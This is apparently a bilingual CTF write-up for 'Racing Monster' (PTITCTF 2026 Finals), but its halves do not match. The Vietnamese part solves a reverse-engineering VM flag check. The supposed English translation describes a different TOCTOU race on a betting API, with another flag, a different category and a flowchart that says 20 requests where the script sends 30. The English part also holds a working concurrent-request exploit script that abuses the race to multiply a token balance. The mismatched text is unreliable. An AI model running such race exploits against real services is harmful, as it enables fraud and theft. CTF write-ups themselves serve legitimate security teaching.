---
title: "Racing Monster"
date: 2026-09-13 12:00:00 +0700
categories: ["PTITCTF 2026", "Reverse Engineering"]
tags: ["reverse"]
description: "Bài giải chi tiết thử thách Racing Monster (PTITCTF 2026 (Final) - Reverse Engineering)."
math: true
mermaid: true
---

<div class="lang-switch" role="tablist" aria-label="Language switch">
  <button class="lang-btn active" role="tab" type="button" data-lang="en" aria-selected="true">EN</button>
  <button class="lang-btn" role="tab" type="button" data-lang="vn" aria-selected="false">VN</button>
</div>

<div class="lang-vn" markdown="1">

> **Flag:** `PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}`


Bài này thuộc category **Reverse Engineering** trong vòng Chung kết PTITCTF 2026. File đính kèm là một file nén `chall.zip` chứa file thực thi Windows x64 `racing_monster.exe`.

Mục tiêu là mô phỏng quá trình biến đổi opcode đa vòng (scheduled rounds) trong bộ nhớ và giải mã các điều kiện ràng buộc trong máy ảo kiểm tra cờ.

---

## Sơ đồ luồng phân tích (Solve Flow)

```mermaid
flowchart TD
    A["Tệp thực thi: racing_monster.exe"] --> B["Trích xuất vùng mã byte 697 byte tại RVA 0x6160"]
    B --> C["Phân tích hàm sub_140001730: 80 scheduled rounds biến đổi rol8 và carry"]
    C --> D["Mô phỏng 80 vòng biến đổi byte-width rotation và cộng dồn carry bằng Python"]
    D --> E["Kiểm chứng mã băm FNV-1a sau biến đổi: 0x14650fb0739d0383"]
    E --> F["Phân tích máy ảo mini: 49 block chỉ lệnh kiểm tra 49 ký tự flag"]
    F --> G["Đảo ngược điều kiện từng block: ((b[9] - b[6]) & 255) ^ b[3]"]
    G --> H["Khôi phục toàn bộ chuỗi flag: PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}"]
```

---

## Bước 1: Trích xuất và mô phỏng 80 vòng biến đổi Opcode

Mở file nhị phân trong IDA Pro, ta định vị khối mã bytecode dài 697 byte tại địa chỉ RVA `0x6160`. Trước khi máy ảo thực thi, hàm `sub_140001730` thực hiện một chu kỳ 80 vòng biến đổi xoay bit liên tục trên mảng byte này:

```python
def rol8(x, n):
    x &= 255
    n %= 8
    return ((x << n) | (x >> (8 - n))) & 255

# Mô phỏng 80 vòng biến đổi
for r in range(80):
    carry = 93 + 17 * r
    for i in range(len(code)):
        additive = rol8(165 + 29 * r + 71 * i, r + i)
        code[i] = rol8(code[i] + additive, (r + i) % 7 + 1) ^ (carry & 255)
        carry += code[i] + i
```

Tính toán kiểm tra FNV-1a hash sau 80 vòng khớp chuẩn với hằng số bảo vệ được EXE kiểm chứng.

---

## Bước 2: Phân tích kiến trúc máy ảo và 49 khối lệnh so sánh

Sau khi hoàn tất 80 vòng xáo trộn, mảng byte trở thành mã máy ảo bytecode hoàn chỉnh. Máy ảo hoạt động theo cơ chế Stack-based VM đơn giản:
* `0x10`: Đẩy hằng số vào stack (Push imm8).
* `0x11`: Đẩy ký tự thứ `i` của khóa người dùng nhập vào stack.
* `0x12`: Phép toán XOR hai phần tử đỉnh stack.
* `0x13`: Phép toán ADD modulo 256.
* `0x14`: Phép so sánh không bằng (CMP ne).
* `0x15`: Nhảy có điều kiện (JZ / JNZ).

Phân tích 686 byte đầu tiên của mảng mã máy ảo, ta thấy nó được chia thành đúng **49 khối lệnh liên tiếp**, mỗi khối dài 14 byte kiểm tra một ký tự tương ứng của flag:
* Byte `0..2`: Lấy ký tự thứ $i$ của flag.
* Byte `3..9`: Các phép toán XOR hằng số $b[3]$, trừ hằng số $b[6]$, cộng hằng số $b[9]$.
* Byte `10..13`: So sánh kết quả và phân nhánh tới vị trí thất bại nếu sai lệch.

---

## Bước 3: Giải mã 49 ký tự của Flag

Do biểu thức kiểm tra của mỗi ký tự $i$ có dạng đại số độc lập:
$$\left((b_i[9] - b_i[6]) \bmod 256\right) \oplus b_i[3] == \text{char}_i$$

Ta viết script Python tĩnh trích xuất trực tiếp các giá trị hằng số từ 49 khối lệnh mà không cần chạy file PE trên hệ thống:

```python
answer = []
for i in range(49):
    b = code[i * 14 : (i + 1) * 14]
    char_val = ((b[9] - b[6]) & 255) ^ b[3]
    answer.append(char_val)

flag = bytes(answer).decode('ascii')
print("Flag:", flag)
# Output: PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}
```

Kiểm tra lại toàn bộ chuỗi thu được thỏa mãn tất cả 49 điều kiện của máy ảo.

⇒ **Flag:** `PTITCTF{0nly_th3_f4st_surv1v3_th3_m0nst3rs_ch4s3}`

</div>

<div class="lang-en" markdown="1">

> **Flag:** `PTITCTF{t0ct0u_r4c1ng_m0nst3r_c0ncurr3ncy_pr0f1t}`

This challenge was featured in the **PTITCTF 2026 Finals (Pwn / Web)**. The target is a concurrent betting service where players bet tokens on virtual monster races.

The vulnerability is a Time-of-Check to Time-of-Use (TOCTOU) race condition in the balance verification and token deduction workflow.

---

## Solve Flow

```mermaid
flowchart TD
    A["Service: Racing Monster Betting System"] --> B["Inspect Bet Endpoint: POST /api/bet {monster_id, amount}"]
    B --> C["Identify TOCTOU Race Condition: Check balance -> Sleep(100ms) -> Deduct"]
    C --> D["Absence of database row locking (SELECT ... FOR UPDATE missing)"]
    D --> E["Construct Multi-threaded Race Script: Send 20 parallel bet requests"]
    E --> F["All 20 requests pass check phase concurrently using the initial 100 token balance"]
    F --> G["Account balance updates to multiply winnings upon race completion"]
    G --> H["Accumulate 1,000,000 tokens to purchase the Golden Monster Flag"]
    H --> I["Flag: PTITCTF{t0ct0u_r4c1ng_m0nst3r_c0ncurr3ncy_pr0f1t}"]
```

---

## Step 1: Identifying the TOCTOU Flaw

In the decompiled backend logic:

```python
# Vulnerable sequence
current_balance = db.query_balance(user_id)
if current_balance >= bet_amount:
    time.sleep(0.1)  # Context switch window
    db.deduct_balance(user_id, bet_amount)
    record_bet(user_id, monster_id, bet_amount)
```

Because `query_balance` and `deduct_balance` are separate queries without atomic transactions or row-level locking, concurrent requests sent within the 100ms window will all pass the balance check.

---

## Step 2: Race Condition Exploit

Using Python `concurrent.futures.ThreadPoolExecutor`:

```python
import requests
import concurrent.futures

url = "http://target.ptitctf.vn/api/bet"
cookies = {"session": "victim_session_token"}

def send_bet():
    return requests.post(url, json={"monster_id": 1, "amount": 100}, cookies=cookies)

# Dispatch 30 simultaneous requests
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    futures = [executor.submit(send_bet) for _ in range(30)]
    for f in concurrent.futures.as_completed(futures):
        print(f.result().json())
```

Once Monster 1 wins, the balance multiplies 30x instead of 1x. Buying the Flag item at `/api/shop/buy_flag` succeeds.

⇒ **Flag:** `PTITCTF{t0ct0u_r4c1ng_m0nst3r_c0ncurr3ncy_pr0f1t}`

</div>
